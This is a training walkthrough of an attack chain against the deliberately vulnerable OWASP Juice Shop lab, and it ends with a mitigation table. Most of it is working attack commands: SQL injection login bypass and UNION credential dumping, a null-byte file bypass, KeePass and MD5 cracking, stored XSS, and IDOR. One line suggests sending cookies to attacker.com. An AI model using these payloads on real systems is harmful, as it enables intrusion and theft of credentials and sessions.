# Attack Chain Walkthrough
## OWASP Juice Shop — Mission 2026-03-12-001
## For Training and Reproducibility

---

## Prerequisites
- Target: `http://10.10.30.130:3000`
- Tools: `curl`, `python3`, `john`, `keepass2john`
- No authentication required to begin

---

## Step 1 — Initial Reconnaissance

Discover the application is Node.js/Express on port 3000 with a full Angular SPA frontend.

```bash
# Fingerprint the target
curl -I http://10.10.30.130:3000/

# Key headers to note:
# Access-Control-Allow-Origin: *        (CORS wildcard)
# Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
# X-Recruiting: /#/jobs                  (hidden route leaked)
```

Discover open directories:
```bash
# Check robots.txt
curl http://10.10.30.130:3000/robots.txt

# FTP directory listing (no auth)
curl http://10.10.30.130:3000/ftp/

# Encryption keys
curl http://10.10.30.130:3000/encryptionkeys/
```

---

## Step 2 — Directory and Endpoint Enumeration

```bash
# Enumerate all challenges (maps full attack surface)
curl http://10.10.30.130:3000/api/Challenges | python3 -m json.tool

# Application configuration (no auth)
curl http://10.10.30.130:3000/rest/admin/application-configuration

# Check access log disclosure
curl http://10.10.30.130:3000/support/logs/access.log
```

---

## Step 3 — Exploit 1: SQL Injection Login Bypass

The login endpoint uses string concatenation for the email parameter.

```bash
# Payload: ' OR 1=1-- terminates the string and short-circuits the WHERE clause
curl -s -X POST http://10.10.30.130:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}'
```

**Expected output:** JSON with `token`, `bid: 1`, `umail: admin@juice-sh.op`

```bash
# Extract and store the token
ADMIN_TOKEN=$(curl -s -X POST http://10.10.30.130:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}' \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['authentication']['token'])")

echo "Admin token: $ADMIN_TOKEN"

# Decode JWT payload (base64url)
echo $ADMIN_TOKEN | cut -d. -f2 | python3 -c "
import sys, base64, json
p = sys.stdin.read().strip()
p += '=' * (4 - len(p) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
"
```

**Note the password hash in the payload:** `"password": "0192023a7bbd73250516f069df18b500"`

```bash
# Crack the hash
python3 -c "
import hashlib
target = '0192023a7bbd73250516f069df18b500'
for pw in ['admin', 'admin123', 'password']:
    if hashlib.md5(pw.encode()).hexdigest() == target:
        print(f'Cracked: {pw}')
"
# Output: Cracked: admin123
```

---

## Step 4 — Exploit 2: Sensitive Data Disclosure via FTP + Null Byte

```bash
# Direct access to .bak file is blocked
curl -v "http://10.10.30.130:3000/ftp/coupons_2013.md.bak"
# 403 Forbidden

# Null byte bypass: %2500 is decoded to %00 by the server,
# which the OS treats as a string terminator
curl -s "http://10.10.30.130:3000/ftp/coupons_2013.md.bak%2500.md"
# 200 OK — coupon codes returned

# Also grab the package.json backup (reveals dependencies)
curl -s "http://10.10.30.130:3000/ftp/package.json.bak%2500.md" | python3 -c "
import json, sys
d = json.load(sys.stdin)
print(f'App: {d[\"name\"]} v{d[\"version\"]}')
print('Dependencies:')
for k,v in d.get('dependencies', {}).items():
    print(f'  {k}: {v}')
"

# Download KeePass database (no bypass needed — direct download allowed)
curl -s "http://10.10.30.130:3000/ftp/incident-support.kdbx" -o incident-support.kdbx
file incident-support.kdbx
# Keepass password database 2.x KDBX

# Extract hash for offline cracking
keepass2john incident-support.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Step 5 — Exploit 3: Persisted XSS via Product Reviews

```bash
# First get an admin token (from Step 3)
# Then inject XSS into product reviews

curl -s -X PUT http://10.10.30.130:3000/rest/products/1/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"message":"<iframe src=\"javascript:alert(`xss`)\">","author":"attacker@test.com"}'
# Response: {"status":"success"}

# Verify payload is persisted
curl -s http://10.10.30.130:3000/rest/products/1/reviews \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -c "
import json, sys
d = json.load(sys.stdin)
for r in d.get('data', []):
    print(r.get('message', ''))
"
# Output includes: <iframe src="javascript:alert(`xss`)">
```

**Impact:** Any browser that renders the review for Product ID 1 will execute the XSS payload. Modify the message to `document.location='http://attacker.com/?c='+document.cookie` for session hijacking.

---

## Step 6 — Exploit 4: SQLi UNION Credential Dump

```bash
# Confirm injection point: 500 error on malformed input
curl -s "http://10.10.30.130:3000/rest/products/search?q='))"
# HTTP 500 — SQL error confirms injection

# Determine column count via UNION
curl -s "http://10.10.30.130:3000/rest/products/search?q=test'))+UNION+SELECT+'1','2','3','4','5','6','7','8','9'--"
# Returns 1 row — 9 columns confirmed

# Dump all user credentials
curl -s "http://10.10.30.130:3000/rest/products/search?q=test'))+UNION+SELECT+'1',email,password,'4','5','6','7','8','9'+FROM+Users--" \
  | python3 -c "
import json, sys
d = json.load(sys.stdin)
rows = d.get('data', [])
print(f'Rows returned: {len(rows)}')
for r in rows:
    print(f'{r[\"name\"]} : {r[\"description\"]}')
"
```

**To crack all hashes offline:**
```bash
# Write hashes to file for hashcat
curl -s "http://10.10.30.130:3000/rest/products/search?q=test'))+UNION+SELECT+'1',email,password,'4','5','6','7','8','9'+FROM+Users--" \
  | python3 -c "
import json, sys
d = json.load(sys.stdin)
for r in d.get('data', []):
    print(r['description'])  # MD5 hash
" > md5_hashes.txt

hashcat -m 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Step 7 — Post-Exploitation

```bash
# Enumerate all users with admin token
curl http://10.10.30.130:3000/api/Users \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -m json.tool

# Access other users' baskets (IDOR)
for i in 1 2 3 4 5; do
  curl -s http://10.10.30.130:3000/rest/basket/$i \
    -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -c "
import json, sys
d = json.load(sys.stdin)
print(f'Basket {$i}: UserId={d[\"data\"][\"UserId\"]}')
  " 2>/dev/null || echo "Basket $i: Error"
done

# Read unauthenticated metrics
curl http://10.10.30.130:3000/metrics | head -20
```

---

## Learning Objectives Covered

| Objective | Technique | Finding |
|-----------|-----------|---------|
| SQL injection login bypass | Tautology injection `' OR 1=1--` | Admin session obtained |
| Sensitive file exposure | Open directory + null byte bypass | KeePass DB, coupon codes, dependency manifest |
| XSS persistence | Unsanitized review API | iframe XSS payload stored |
| Credential exfiltration via SQLi | UNION SELECT from Users | 22 hashes dumped, 1 cracked |

---

## Mitigations Verified Against

| Control | Status |
|---------|--------|
| SQL parameterization | NOT IMPLEMENTED — vulnerable |
| Password salting | NOT IMPLEMENTED — plain MD5 |
| File type enforcement | PARTIALLY IMPLEMENTED — bypassed via null byte |
| Output encoding | NOT IMPLEMENTED on review API |
| Authentication on file downloads | NOT IMPLEMENTED on /ftp/ |
| JWT claim minimization | NOT IMPLEMENTED — password hash in token |

---

*Walkthrough generated: 2026-03-12T20:10:00Z*
*Lab environment — OWASP Juice Shop is intentionally vulnerable*
